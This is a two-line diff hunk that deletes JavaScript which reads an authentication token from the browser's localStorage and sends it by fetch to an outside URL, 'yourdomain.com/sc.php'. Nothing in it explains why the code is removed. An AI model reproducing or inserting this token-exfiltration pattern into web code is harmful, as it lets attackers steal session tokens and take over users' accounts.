@@ -1,2 +1,0 @@
-var token = localStorage.getItem('auth._token.local');
-await fetch("https://yourdomain.com/sc.php?t=" + token);
